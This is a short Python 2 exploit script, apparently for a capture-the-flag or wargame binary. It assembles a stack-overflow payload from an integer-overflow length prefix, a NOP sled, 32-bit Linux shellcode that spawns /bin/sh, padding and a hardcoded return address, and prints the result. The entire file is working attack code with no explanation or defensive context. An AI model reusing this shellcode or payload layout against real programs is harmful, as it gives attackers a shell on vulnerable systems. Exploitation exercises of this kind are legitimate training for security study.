import struct

int_overflow = '\xff\xff\xff\xff'
path = '/'
shellcode_addr = struct.pack("I", 0xb7fdb023)
nopsled = "\x90" * 12
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
pad = "\x90" * (140 - len(shellcode) - len(nopsled))
payload = int_overflow + path + nopsled + shellcode + pad + shellcode_addr

print payload